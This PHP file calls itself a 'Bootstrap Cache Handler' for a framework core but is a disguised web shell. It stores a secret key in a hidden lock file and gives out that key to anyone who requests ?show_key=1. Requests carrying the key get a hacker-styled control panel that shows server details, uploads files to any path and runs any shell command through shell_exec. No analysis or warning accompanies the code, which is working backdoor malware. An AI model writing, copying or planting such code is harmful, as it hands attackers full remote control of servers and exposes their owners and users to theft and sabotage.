<?php
/*
 * Bootstrap Cache Handler
 * @package Framework Core
 * @license MIT
 */

if(!defined('_INIT')){define('_INIT',1);}

$k=bin2hex(random_bytes(16));
$lock_file=__DIR__.'/.'.md5(__FILE__).'.lock';
if(file_exists($lock_file)){
    $k=file_get_contents($lock_file);
}else{
    file_put_contents($lock_file,$k);
    @chmod($lock_file,0644);
}

if(isset($_GET[$k])||isset($_POST[$k])){
    echo "<html><head><title>System Manager</title>";
    echo "<style>body{background:#1a1a1a;color:#0f0;font-family:monospace;padding:20px}";
    echo "table{border-collapse:collapse;width:100%;margin:20px 0}";
    echo "td,th{border:1px solid #0f0;padding:8px;text-align:left}";
    echo "th{background:#0a0a0a}input,textarea{background:#0a0a0a;color:#0f0;border:1px solid #0f0;padding:5px;width:100%}";
    echo ".btn{background:#0a0a0a;color:#0f0;border:2px solid #0f0;padding:10px 20px;cursor:pointer}</style></head><body>";
    
    echo "<h2>Server Information</h2><table>";
    echo "<tr><th>Parameter</th><th>Value</th></tr>";
    echo "<tr><td>Server Software</td><td>".$_SERVER['SERVER_SOFTWARE']."</td></tr>";
    echo "<tr><td>Server Name</td><td>".$_SERVER['SERVER_NAME']."</td></tr>";
    echo "<tr><td>Server IP</td><td>".$_SERVER['SERVER_ADDR']."</td></tr>";
    echo "<tr><td>PHP Version</td><td>".PHP_VERSION."</td></tr>";
    echo "<tr><td>System</td><td>".php_uname()."</td></tr>";
    echo "<tr><td>Current User</td><td>".get_current_user()."</td></tr>";
    echo "<tr><td>Current Dir</td><td>".getcwd()."</td></tr>";
    echo "<tr><td>Disabled Functions</td><td>".ini_get('disable_functions')."</td></tr></table>";
    
    echo "<h2>File Uploader</h2>";
    echo "<form method='post' enctype='multipart/form-data'>";
    echo "Upload to: <input type='text' name='upload_path' value='".getcwd()."' /><br><br>";
    echo "Select file: <input type='file' name='file' /><br><br>";
    echo "<input type='submit' name='upload' value='Upload File' class='btn' /></form>";
    
    if(isset($_POST['upload'])&&isset($_FILES['file'])){
        $target=$_POST['upload_path'].'/'.basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'],$target)){
            echo "<p style='color:#0f0'>[+] File uploaded to: $target</p>";
        }else{
            echo "<p style='color:#f00'>[-] Upload failed!</p>";
        }
    }
    
    echo "<h2>Command Executor</h2>";
    echo "<form method='post'>";
    echo "<input type='text' name='cmd' placeholder='Enter command...' /><br><br>";
    echo "<input type='submit' name='execute' value='Execute' class='btn' /></form>";
    
    if(isset($_POST['execute'])&&!empty($_POST['cmd'])){
        echo "<pre style='background:#0a0a0a;padding:10px;border:1px solid #0f0;margin-top:10px'>";
        echo htmlspecialchars(shell_exec($_POST['cmd']));
        echo "</pre>";
    }
    
    echo "</body></html>";
    exit;
}

if(isset($_GET['show_key'])&&$_GET['show_key']=='1'){
    header('Content-Type: text/plain');
    echo "Your access key: ".$k."\n";
    echo "Usage: ".$_SERVER['PHP_SELF']."?".$k."\n";
    exit;
}

$s=$_SERVER['SERVER_SOFTWARE'];
?>
